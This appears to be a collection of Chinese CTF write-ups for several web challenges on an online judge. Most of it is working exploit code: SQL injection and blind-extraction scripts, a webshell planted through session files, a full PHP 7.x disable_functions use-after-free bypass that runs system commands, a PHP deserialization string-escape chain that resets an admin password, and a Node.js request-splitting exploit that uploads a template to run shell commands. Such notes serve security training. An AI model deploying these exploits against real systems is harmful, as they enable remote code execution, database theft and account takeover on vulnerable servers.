## Blacklist
#sql-handler
`1';show tables;#`
`1';select * from FlagHere;#`

![](attachments/Pasted%20image%2020240319201003.png)

`1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#`

![](attachments/Pasted%20image%2020240319201837.png)
## Ezsqli

```python
import requests  
  
url = "http://2e9aa8d7-057c-449f-9f70-3e96ee92b9df.node5.buuoj.cn:81/index.php"  
  
payload = "2||(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),{},1))={})"  
  
  
result = ""  
  
for i in range(1, 200):  
    for j in range(32, 127):  
       data = payload.format(i, j)  
       # print(data)  
       res = requests.post(url, data={"id": data})  
       # print(res.text)  
       if "Nu1L" in res.text:  
          result += chr(j)  
          print(result)  
          break
```

贴一个二分法的

```python
import requests  
  
url = "http://2e9aa8d7-057c-449f-9f70-3e96ee92b9df.node5.buuoj.cn:81/index.php"  
result = '' 
payload = "2||ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),{},1))>{}"  
for i in range(1, 10000):  
    low = 32  
    high = 128  
    mid = (low + high) // 2  
    while (low < high):  
        data = payload.format(i, mid)  
        data1 = {  
            'id': data  
        }  
        r = requests.post(url=url, data=data1)  
        if "Nu1L" in r.text:  
            low = mid + 1  
        else:  
            high = mid  
        mid = (low + high) // 2  
    if (mid == 32 or mid == 132):  
        break  
    result += chr(mid)  
    print(result)
```

```python
import requests  
  
url = "http://2e9aa8d7-057c-449f-9f70-3e96ee92b9df.node5.buuoj.cn:81/index.php"  
result = ''
payload = "1^1^((select 1,'{}') > (select * from f1ag_1s_h3r3_hhhhh))"  
  
while True:  
    for i in range(1, 128):  
       print(result+chr(i))  
       data = payload.format(result+chr(i))  
       # print(data)  
       data1 = {"id": data}  
       res = requests.post(url, data=data1)  
       # print(res.text)  
       if "Nu1L" in res.text:  
          print("========================================")  
          result += chr(i-1)  
          print(result)  
          break
```


## EasyThinking
报错拿到版本
![](attachments/Pasted%20image%2020240329192613.png)

在登陆时修改session为包含`.php`后缀名的32位session
在搜索框输入一个一句话木马
完成写马

访问/runtime/session/sess_`session`
![](attachments/Pasted%20image%2020240329193821.png)
存在函数禁用

![](attachments/Pasted%20image%2020240329193903.png)

![](attachments/Pasted%20image%2020240329193953.png)

打UAF绕过
蚁剑连接后将uaf脚本上传过去执行/readflag

```PHP
<?php

# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=76047
# debug_backtrace() returns a reference to a variable 
# that has been destroyed, causing a UAF vulnerability.
#
# This exploit should work on all PHP 7.0-7.4 versions
# released as of 30/01/2020.
#
# Author: https://github.com/mm0r1

pwn("/readflag");

function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);
    exit();
}
```

蚁🗡上传

![](attachments/Pasted%20image%2020240330085725.png)


## Easyphp
`www.zip`源码泄露
字符串逃逸
```php
function safe($parm){  
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");  
    return str_replace($array,'hacker',$parm);  
}
```

pop链
```
UpdateHelper::__destruct->User::__toString->Info::__call->dbCtrl::login
```

反序列化入口

![](attachments/Pasted%20image%2020240331113845.png)

update.php中调用了update函数

```PHP
<?php  
require_once('lib.php');  
echo '<html>  
<meta charset="utf-8">  
<title>update</title>  
<h2>这是一个未完成的页面，上线时建议删除本页面</h2>  
</html>';  
if ($_SESSION['login']!=1){  
    echo "你还没有登陆呢！";  
}  
$users=new User();  
$users->update();  
if($_SESSION['login']===1){  
    require_once("flag.php");  
    echo $flag;  
}  
  
?>
```

poc
```php
<?php  
  
Class UpdateHelper  
{  
    public $sql;  
    public function __construct()  
    {  
        $this->sql = new User;  
    }  
}  
Class User  
{  
    public $nickname;  
    public $age;  
    public function __construct()  
    {  
        $this->nickname = new Info;  
        $this->age = "select id,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?";  
    }  
}  
  
Class Info  
{  
    public $CtrlCase;  
    public function __construct()  
    {  
        $this->CtrlCase = new dbCtrl;  
    }  
}  
Class dbCtrl  
{  
    public $hostname="127.0.0.1";  
    public $dbuser="root";  
    public $dbpass="root";  
    public $database="test";  
    public $name = "admin";  
    public $password = "1";  
}
```

`select id,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?`

sql语句将admin的密码设置为1

此时由于触发反序列化时需要要对info进行序列化，将poc序列化的结果代入只会被当做字符串处理，此时需要利用safe函数进行反序列化逃逸

长度为351，因此需要利用safe使nikename字符串替换后长度为351，将拼接在nickname中的poc挤出去作为单独的序列化数据

```
O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":6:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}s:3:"age";s:71:"select id,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";}}
```

safe函数将敏感字符串替换为`hacker`，uinon长度为5比较方便计算长度。

将传入的nickname构造为 `union*n";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":6:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}s:3:"age";s:76:"update user SET password="c4ca4238a0b923820dcc509a6f75849b" where username=?";}}}`

实际需要的union的数量为上面的poc去掉`union*n`后的长度

```python
import requests

payload = '";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":6:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}s:3:"age";s:76:"update user SET password="c4ca4238a0b923820dcc509a6f75849b" where username=?";}}}'

payload = "union"*len(payload)+payload;

print(payload)
url = "http://1a1c19e1-3624-4701-bfe8-8c5940a0f475.node5.buuoj.cn:81/update.php"

datas = {
	"age": "1",
	"nickname": payload
}

res = requests.post(url,data=datas)
print(res.text)
```


## Node Game
源码

```node.js
var express = require('express');
var app = express();
var fs = require('fs');
var path = require('path');
var http = require('http');
var pug = require('pug');
var morgan = require('morgan');
const multer = require('multer');
app.use(multer({
        dest: './dist'
    }).array('file'));
app.use(morgan('short'));
app.use("/uploads", express.static(path.join(__dirname, '/uploads')))
app.use("/template", express.static(path.join(__dirname, '/template')))
app.get('/', function(req, res) {
    var action = req.query.action ? req.query.action : "index";
    if (action.includes("/") || action.includes("\\")) {
        res.send("Errrrr, You have been Blocked");
    }
    file = path.join(__dirname + '/template/' + action + '.pug');
    var html = pug.renderFile(file);
    res.send(html);
});
app.post('/file_upload', function(req, res) {
    var ip = req.connection.remoteAddress;
    var obj = {
        msg: '',
    }
    if (!ip.includes('127.0.0.1')) {
        obj.msg = "only admin's ip can use it"
        res.send(JSON.stringify(obj));
        return
    }
    fs.readFile(req.files[0].path, function(err, data) {
        if (err) {
            obj.msg = 'upload failed';
            res.send(JSON.stringify(obj));
        } else {
            var file_path = '/uploads/' + req.files[0].mimetype + "/";
            var file_name = req.files[0].originalname
            var dir_file = __dirname + file_path + file_name
            if (!fs.existsSync(__dirname + file_path)) {
                try {
                    fs.mkdirSync(__dirname + file_path)
                } catch (error) {
                    obj.msg = "file type error";
                    res.send(JSON.stringify(obj));
                    return
                }
            }
            try {
                fs.writeFileSync(dir_file, data)
                obj = {
                    msg: 'upload success',
                    filename: file_path + file_name
                }
            } catch (error) {
                obj.msg = 'upload failed';
            }
            res.send(JSON.stringify(obj));
        }
    })
})
app.get('/source', function(req, res) {
    res.sendFile(path.join(__dirname + '/template/source.txt'));
});
app.get('/core', function(req, res) {
            var q = req.query.q;
            var resp = "";
            if (q) {
                var url = 'http://localhost:8081/source?' + q
                console.log(url)
                var trigger = blacklist(url);
                if (trigger === true) {
                    res.send("error occurs!");
                } else {
                    try {
                        http.get(url, function(resp) {
                            resp.setEncoding('utf8');
                            resp.on('error', function(err) {
                                if (err.code === "ECONNRESET ") {
                                    console.log("Timeout occurs ");
                                    return;
                                }
                            });
                            resp.on('data', function(chunk) {
                                try {
                                    resps = chunk.toString();
                                    res.send(resps);
                                }catch (e) {
                                    res.send(e.message);
                                }
                            }).on('error', (e) => { res.send(e.message);});
                        });
                    } catch (error) { console.log(error); }
                }
            } else {
                res.send("search param 'q'missing!");
            }
        })
        function blacklist(url) {
            var evilwords = ["global ", "process ","mainModule ","require ","root ","child_process ","exec ","\"", "'", "!"];
                    var arrayLen = evilwords.length;
                    for (var i = 0; i < arrayLen; i++) {
                        const trigger = url.includes(evilwords[i]);
                        if (trigger === true) {
                            return true
                        }
                    }
                }
                var server = app.listen(8081, function() {
                    var host = server.address().address
                    var port = server.address().port
                        console.log("Example app listening at http://%s:%s", host, port)
                })
```

切分绕过黑名单

exp
```python
import requests
  
payload = """ HTTP/1.1
Host: 127.0.0.1
Connection: keep-alive
  
POST /file_upload HTTP/1.1
Host: 127.0.0.1
Content-Length: {}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt
  
{}""".replace('\n', '\r\n')
  
body = """------WebKitFormBoundarysAs7bV3fMHq0JXUt
Content-Disposition: form-data; name="file"; filename="lmonstergg.pug"
Content-Type: ../template
  
-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")
-return x
------WebKitFormBoundarysAs7bV3fMHq0JXUt--
  
""".replace('\n', '\r\n')
  
payload = payload.format(len(body), body) \
    .replace('+', '\u012b')             \
    .replace(' ', '\u0120')             \
    .replace('\r\n', '\u010d\u010a')    \
    .replace('"', '\u0122')             \
    .replace("'", '\u0a27')             \
    .replace('[', '\u015b')             \
    .replace(']', '\u015d') \
    + 'GET' + '\u0120' + '/'
  
session = requests.Session()
session.trust_env = False
response1 = session.get('http://27ecb626-7a29-46ac-a3f3-57ed176b00dc.node5.buuoj.cn:81/core?q=' + payload)
response = session.get('http://27ecb626-7a29-46ac-a3f3-57ed176b00dc.node5.buuoj.cn:81/?action=lmonstergg')
print(response.text)
```

http走私等着补补档